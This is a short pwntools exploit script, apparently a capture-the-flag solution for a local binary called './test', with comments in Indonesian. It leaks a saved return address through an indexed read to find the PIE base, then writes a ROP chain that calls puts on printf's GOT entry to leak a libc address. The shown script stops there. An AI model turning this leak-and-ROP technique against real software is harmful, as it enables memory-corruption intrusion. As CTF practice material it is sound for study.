from pwn import *

# offset RIP berada pada index 56

p = process('./test')
e = ELF('./test')

def isi(i, ch):
 p.sendline('i')
 p.sendline(str(i))
 p.sendline(ch)
 p.recvuntil('filled\n')

def baca(i):
 p.sendline('r')
 p.sendline(str(i))
 p.recvuntil('is ')
 leaked = chr(eval(p.recvline()[:-1]) & 0xff)
 return leaked

# Leaked RIP for find base PIE address
'''
p.sendline('r')
p.sendline('56')
p.recvuntil('is ')
print chr(eval(p.recvline()) & 0xff)
'''
basepie = ''
offset_rip = 0x994
for i in range(40, 40+8):
 basepie += baca(i)
 #log.info(basepie)

basepie = u64(basepie)
#print basepie
basepie -= offset_rip
#print basepie

# Get Base PIE
log.info("Base PIE\t: 0x{0:x}".format(basepie))

gotprintf = p64(e.got['printf'] + basepie)
puts = p64(e.symbols['puts'] + basepie)
main = p64(e.symbols['main'] + basepie)
poprdi = p64(0x0000000000000f73 + basepie)
poprsir15 = p64(0x0000000000000f71 + basepie)
payload = poprdi + gotprintf + puts + main

log.info('Leaking libc')
k = 40
for i in payload:
 isi(k, i)
 k += 1

#Get Libc printf address
p.sendline('x')
printf = p.recvline()
printfaddr =  u64(printf[:-1]+'\x00\x00')

log.info('Printf libc\t: 0x{0:x}'.format(printfaddr))

